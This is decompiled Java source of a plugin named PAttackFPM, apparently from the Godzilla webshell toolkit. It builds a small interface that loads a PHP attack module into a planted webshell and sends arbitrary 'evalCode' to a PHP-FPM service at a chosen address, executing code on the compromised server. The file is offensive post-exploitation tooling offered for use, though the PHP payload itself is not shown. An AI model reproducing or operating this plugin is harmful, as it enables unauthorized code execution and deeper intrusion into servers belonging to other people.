/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.border.TitledBorder;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "PAttackFPM", DisplayName = "AttackFPM")
/*     */ public class PAttackFPM
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "AttackFPM";
/*     */   private final JPanel panel;
/*     */   private PhpEvalCode phpEvalCode;
/*     */   private final RTextArea evalCodeTextArea;
/*     */   private final RTextArea resultTextArea;
/*     */   private final JButton goButton;
/*     */   private final JButton loadButton;
/*     */   private final JLabel fpmAddressLabel;
/*     */   private final JLabel scriptFileLabel;
/*     */   private final JTextField fpmAddressTextField;
/*     */   private final JTextField scriptFileTextField;
/*     */   private final JSplitPane bottomSplitPane;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public PAttackFPM() {
/*  51 */     this.panel = new JPanel(new BorderLayout());
/*     */     
/*  53 */     this.fpmAddressLabel = new JLabel("fpmAddress :");
/*  54 */     this.scriptFileLabel = new JLabel("scriptFile :");
/*  55 */     this.loadButton = new JButton("Load");
/*  56 */     this.goButton = new JButton("Go");
/*  57 */     this.evalCodeTextArea = new RTextArea();
/*  58 */     this.resultTextArea = new RTextArea();
/*  59 */     this.fpmAddressTextField = new JTextField("127.0.0.1:9000", 15);
/*  60 */     this.scriptFileTextField = new JTextField("/var/www/html/index.php", 25);
/*     */     
/*  62 */     this.evalCodeTextArea.setBorder(new TitledBorder("evalCode"));
/*  63 */     this.resultTextArea.setBorder(new TitledBorder("result"));
/*     */ 
/*     */     
/*  66 */     this.evalCodeTextArea.setText("\t\t\t\t\t\t\t\necho 'hello word!';");
/*     */ 
/*     */     
/*  69 */     this.bottomSplitPane = new JSplitPane();
/*     */     
/*  71 */     this.bottomSplitPane.setOrientation(0);
/*  72 */     this.bottomSplitPane.setDividerSize(0);
/*     */     
/*  74 */     JPanel topPanel = new JPanel();
/*  75 */     topPanel.add(this.fpmAddressLabel);
/*  76 */     topPanel.add(this.fpmAddressTextField);
/*  77 */     topPanel.add(this.scriptFileLabel);
/*  78 */     topPanel.add(this.scriptFileTextField);
/*  79 */     topPanel.add(this.loadButton);
/*  80 */     topPanel.add(this.goButton);
/*     */     
/*  82 */     this.bottomSplitPane.setTopComponent(topPanel);
/*     */     
/*  84 */     JSplitPane splitPane = new JSplitPane();
/*     */     
/*  86 */     splitPane.setOrientation(1);
/*     */     
/*  88 */     splitPane.setLeftComponent(new JScrollPane((Component)this.evalCodeTextArea));
/*  89 */     splitPane.setRightComponent(new JScrollPane((Component)this.resultTextArea));
/*     */ 
/*     */ 
/*     */     
/*  93 */     this.bottomSplitPane.setBottomComponent(splitPane);
/*     */     
/*  95 */     this.panel.add(this.bottomSplitPane);
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/*  99 */     if (!this.loadState) {
/*     */       try {
/* 101 */         InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { "AttackFPM" }));
/* 102 */         byte[] data = functions.readInputStream(inputStream);
/* 103 */         inputStream.close();
/* 104 */         if (this.payload.include("AttackFPM", data)) {
/* 105 */           this.loadState = true;
/* 106 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/* 108 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/* 110 */       } catch (Exception e) {
/* 111 */         Log.error(e);
/* 112 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/* 116 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void goButtonClick(ActionEvent actionEvent) {
/* 120 */     String fpmAddress = this.fpmAddressTextField.getText().trim();
/* 121 */     String evalCode = this.evalCodeTextArea.getText();
/* 122 */     String scriptFile = this.scriptFileTextField.getText().trim();
/* 123 */     String fpmHost = "";
/* 124 */     int fpmPort = -1;
/*     */     
/*     */     try {
/* 127 */       if (fpmAddress.startsWith("unix")) {
/* 128 */         fpmHost = fpmAddress;
/* 129 */       } else if (fpmAddress.startsWith("/")) {
/* 130 */         fpmHost = String.format("unix://%s", new Object[] { fpmAddress });
/*     */       } else {
/* 132 */         String[] is = fpmAddress.split(":");
/* 133 */         fpmHost = is[0];
/* 134 */         fpmPort = Integer.valueOf(is[1]).intValue();
/*     */       } 
/* 136 */     } catch (Exception e) {
/* 137 */       Log.error(e);
/* 138 */       GOptionPane.showMessageDialog(null, e.getMessage());
/*     */       
/*     */       return;
/*     */     } 
/*     */     
/* 143 */     ReqParameter reqParamete = new ReqParameter();
/* 144 */     reqParamete.add("evalCode", evalCode);
/* 145 */     reqParamete.add("scriptFile", scriptFile);
/* 146 */     reqParamete.add("fpm_host", fpmHost);
/* 147 */     reqParamete.add("fpm_port", String.valueOf(fpmPort));
/* 148 */     byte[] result = this.payload.evalFunc("AttackFPM", "run", reqParamete);
/* 149 */     String resultString = this.encoding.Decoding(result);
/* 150 */     this.resultTextArea.setText(resultString);
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 155 */     this.shellEntity = shellEntity;
/* 156 */     this.payload = this.shellEntity.getPayloadModule();
/* 157 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 158 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 165 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PAttackFPM.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */